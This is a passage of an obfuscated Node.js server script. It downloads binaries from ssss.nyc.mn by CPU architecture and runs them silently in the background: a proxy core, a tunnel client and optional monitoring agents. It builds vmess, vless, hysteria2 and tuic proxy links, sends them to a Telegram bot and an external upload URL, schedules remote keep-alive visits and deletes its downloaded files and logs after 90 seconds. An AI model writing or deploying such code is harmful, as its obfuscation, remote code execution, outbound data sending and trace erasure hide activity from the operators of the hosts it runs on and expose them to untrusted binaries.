com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs','listen','unshift','stream','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://amd64.ssss.nyc.mn/sb','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','server\x20is\x20running\x20on\x20port:','arm','Failed\x20to\x20send\x20Telegram\x20message','\x20>/dev/null\x202>&1\x20&','base64','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','stringify'];_0xe2b9=function(){return _0x313e04;};return _0xe2b9();}function execPromise(_0x113136){return new Promise((_0x3ea630,_0x4f68b9)=>{exec(_0x113136,(_0x5d8675,_0x3afbae,_0x5e7432)=>{_0x5d8675?_0x4f68b9(_0x5d8675):_0x3ea630(_0x3afbae||_0x5e7432);});});}function getFilesForArchitecture(_0x2f67e1){const _0x2ae5a4=_0x318dce;let _0x307791;_0x2f67e1===_0x2ae5a4(0x2df)?_0x307791=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/sb'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x307791=[{'fileName':webPath,'fileUrl':_0x2ae5a4(0x2dc)},{'fileName':botPath,'fileUrl':_0x2ae5a4(0x293)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x589dba=_0x2f67e1===_0x2ae5a4(0x2df)?_0x2ae5a4(0x2cd):'https://amd64.ssss.nyc.mn/agent';_0x307791['unshift']({'fileName':npmPath,'fileUrl':_0x589dba});}else{const _0x131f63=_0x2f67e1===_0x2ae5a4(0x2df)?_0x2ae5a4(0x26e):'https://amd64.ssss.nyc.mn/v1';_0x307791[_0x2ae5a4(0x2d9)]({'fileName':phpPath,'fileUrl':_0x131f63});}}return _0x307791;}async function extractDomains(){const _0x49f963=_0x318dce;let _0x453a13;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x453a13=SUIDAO_DOMAIN,console[_0x49f963(0x278)](_0x49f963(0x289),_0x453a13),await generateLinks(_0x453a13);else try{const _0x5273b8=fs[_0x49f963(0x26f)](path[_0x49f963(0x29c)](FILE_PATH,_0x49f963(0x219)),_0x49f963(0x21c)),_0x103dc7=_0x5273b8['split']('\x0a'),_0x1e869a=[];_0x103dc7[_0x49f963(0x29d)](_0x5c358b=>{const _0x5896b7=_0x49f963,_0x28da84=_0x5c358b['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x28da84){const _0x8567e6=_0x28da84[0x1];_0x1e869a[_0x5896b7(0x277)](_0x8567e6);}});if(_0x1e869a[_0x49f963(0x28e)]>0x0)_0x453a13=_0x1e869a[0x0],console['log'](_0x49f963(0x1fa),_0x453a13),await generateLinks(_0x453a13);else{console[_0x49f963(0x278)]('SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain'),fs[_0x49f963(0x271)](path['join'](FILE_PATH,'boot.log'));async function _0x17fd87(){const _0x550f54=_0x49f963;try{await exec('pkill\x20-f\x20\x22['+botName[_0x550f54(0x258)](0x0)+']'+botName[_0x550f54(0x267)](0x1)+_0x550f54(0x286));}catch(_0x4d81d6){return null;}}_0x17fd87(),await new Promise(_0x212917=>setTimeout(_0x212917,0x3e8));const _0x27b6b9=_0x49f963(0x295)+FILE_PATH+_0x49f963(0x275)+SUIDAO_PORT;try{await exec(_0x49f963(0x23d)+botPath+'\x20'+_0x27b6b9+_0x49f963(0x2e1)),console[_0x49f963(0x278)](botName+_0x49f963(0x1ff)),await new Promise(_0x3fabb2=>setTimeout(_0x3fabb2,0x1770)),await extractDomains();}catch(_0x40948d){console[_0x49f963(0x213)]('Error\x20executing\x20command:\x20'+_0x40948d);}}}catch(_0x21545a){console['error'](_0x49f963(0x2ad),_0x21545a);}}async function generateLinks(_0xde9951){const _0xaf3543=_0x318dce;let _0x1d2f3e='';try{_0x1d2f3e=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb')[_0xaf3543(0x263)]()[_0xaf3543(0x273)]();}catch(_0x239b79){try{_0x1d2f3e='['+execSync(_0xaf3543(0x252))['toString']()['trim']()+']';}catch(_0xb85166){console[_0xaf3543(0x213)](_0xaf3543(0x246),_0xb85166[_0xaf3543(0x22d)]);}}const _0x2037cc=execSync(_0xaf3543(0x2b9),{'encoding':_0xaf3543(0x21c)}),_0x539b58=_0x2037cc['trim'](),_0x57413c=NAME?NAME+'-'+_0x539b58:_0x539b58;return new Promise(_0x37144b=>{setTimeout(()=>{const _0x17ec39=_0xa3fe,_0x19f661=_0x17ec39(0x274)+Buffer[_0x17ec39(0x26b)](JSON[_0x17ec39(0x1f4)]({'v':'2','ps':''+_0x57413c,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':_0x17ec39(0x1f5),'net':'ws','type':_0x17ec39(0x1f5),'host':_0xde9951,'path':_0x17ec39(0x200),'tls':'tls','sni':_0xde9951,'alpn':'','fp':_0x17ec39(0x2a7)}))['toString'](_0x17ec39(0x1f2));let _0x57861a=_0x19f661;if(isValidPort(TUYIKE_PORT)){const _0x4a2f08='\x0atuic://'+KAMAN+':@'+_0x1d2f3e+':'+TUYIKE_PORT+_0x17ec39(0x1f9)+_0x57413c;_0x57861a+=_0x4a2f08;}if(isValidPort(XIESIDILI_PORT)){const _0x1faf69='\x0ahysteria2://'+KAMAN+'@'+_0x1d2f3e+':'+XIESIDILI_PORT+_0x17ec39(0x22a)+_0x57413c;_0x57861a+=_0x1faf69;}if(isValidPort(XIANSHI_PORT)){const _0x32bb69='\x0avless://'+KAMAN+'@'+_0x1d2f3e+':'+XIANSHI_PORT+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk='+publicKey+_0x17ec39(0x27e)+_0x57413c;_0x57861a+=_0x32bb69;}console['log'](Buffer['from'](_0x57861a)[_0x17ec39(0x263)](_0x17ec39(0x1f2))),fs[_0x17ec39(0x256)](subPath,Buffer['from'](_0x57861a)[_0x17ec39(0x263)](_0x17ec39(0x1f2))),fs['writeFileSync'](listPath,_0x57861a,_0x17ec39(0x1f7)),console[_0x17ec39(0x278)](FILE_PATH+_0x17ec39(0x2cb)),sendTelegram(),uplodNodes(),app[_0x17ec39(0x2b4)]('/'+SUB_PATH,(_0x3fadcb,_0x4b0f40)=>{const _0x466b8b=_0x17ec39,_0x35d23f=Buffer[_0x466b8b(0x26b)](_0x57861a)[_0x466b8b(0x263)](_0x466b8b(0x1f2));_0x4b0f40[_0x466b8b(0x204)]('Content-Type','text/plain;\x20charset=utf-8'),_0x4b0f40[_0x466b8b(0x2a4)](_0x35d23f);}),_0x37144b(_0x57861a);},0x7d0);});}function cleanFiles(){setTimeout(()=>{const _0x1eaf65=_0xa3fe,_0x2887d5=[bootLogPath,configPath,listPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x2887d5['push'](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x2887d5[_0x1eaf65(0x277)](phpPath);exec(_0x1eaf65(0x255)+_0x2887d5['join']('\x20')+_0x1eaf65(0x2c3),_0x46537d=>{const _0x324b1f=_0x1eaf65;console[_0x324b1f(0x25e)](),console['log'](_0x324b1f(0x214)),console[_0x324b1f(0x278)](_0x324b1f(0x2b7));});},0x15f90);}function _0xa3fe(_0x244961,_0x641088){const _0xe2b9b9=_0xe2b9();return _0xa3fe=function(_0xa3fedf,_0x143615){_0xa3fedf=_0xa3fedf-0x1f2;let _0x237776=_0xe2b9b9[_0xa3fedf];return _0x237776;},_0xa3fe(_0x244961,_0x641088);}async function sendTelegram(){const _0x169bbc=_0x318dce;if(!BOT_TOKEN||!CHAT_ID){console[_0x169bbc(0x278)](_0x169bbc(0x242));return;}try{const _0x1b0406=fs[_0x169bbc(0x26f)](path['join'](FILE_PATH,'sub.txt'),_0x169bbc(0x1f7)),_0x3ad348=_0x169bbc(0x220)+BOT_TOKEN+_0x169bbc(0x23b),_0x150534=NAME['replace'](/[_*[\]()~`>#+=|{}.!-]/g,_0x169bbc(0x2d5)),_0x4b0e72={'chat_id':CHAT_ID,'text':'**'+_0x150534+_0x169bbc(0x288)+_0x1b0406+_0x169bbc(0x299),'parse_mode':_0x169bbc(0x240)};await axios[_0x169bbc(0x259)](_0x3ad348,null,{'params':_0x4b0e72}),console[_0x169bbc(0x278)](_0x169bbc(0x2bf));}catch(_0x2df818){console[_0x169bbc(0x213)](_0x169bbc(0x2e0),_0x2df818);}}async function uplodNodes(){const _0x203695=_0x318dce;if(UPLOAD_URL&&PROJECT_URL){const _0x55ccaa=PROJECT_URL+'/'+SUB_PATH,_0x4efb0c={'subscription':[_0x55ccaa]};try{const _0xd0d758=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x4efb0c,{'headers':{'Content-Type':'application/json'}});if(_0xd0d758['status']===0xc8)console['log'](_0x203695(0x270));else return null;}catch(_0x25e678){if(_0x25e678[_0x203695(0x2bc)]){if(_0x25e678[_0x203695(0x2bc)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x203695(0x222)](listPath))return;const _0x59bf62=fs['readFileSync'](listPath,'utf-8'),_0x43400d=_0x59bf62['split']('\x0a')['filter'](_0x5a6cf5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x203695(0x2a1)](_0x5a6cf5));if(_0x43400d['length']===0x0)return;const _0x385b7b=JSON['stringify']({'nodes':_0x43400d});try{const _0x42973a=await axios[_0x203695(0x259)](UPLOAD_URL+_0x203695(0x281),_0x385b7b,{'headers':{'Content-Type':_0x203695(0x236)}});if(_0x42973a[_0x203695(0x27d)]===0xc8)console[_0x203695(0x278)](_0x203695(0x270));else return null;}catch(_0x1e2440){return null;}}else return;}}async function AddVisitTask(){const _0x243d6f=_0x318dce;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x243d6f(0x278)](_0x243d6f(0x265));return;}try{const _0x2413d3=await axios[_0x243d6f(0x259)](_0x243d6f(0x22f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x243d6f(0x236)}});console[_0x243d6f(0x278)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x100dcf){console[_0x243d6f(0x213)]('添加URL失败:\x20'+_0x100dcf[_0x243d6f(0x22d)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),suidaoType(),await downloadFilesAndRun(),AddVisitTask(),cleanFiles();}startserver(),app[_0x318dce(0x2d8)](PORT,()=>console[_0x318dce(0x278)](_0x318dce(0x2de)+PORT+'!'));
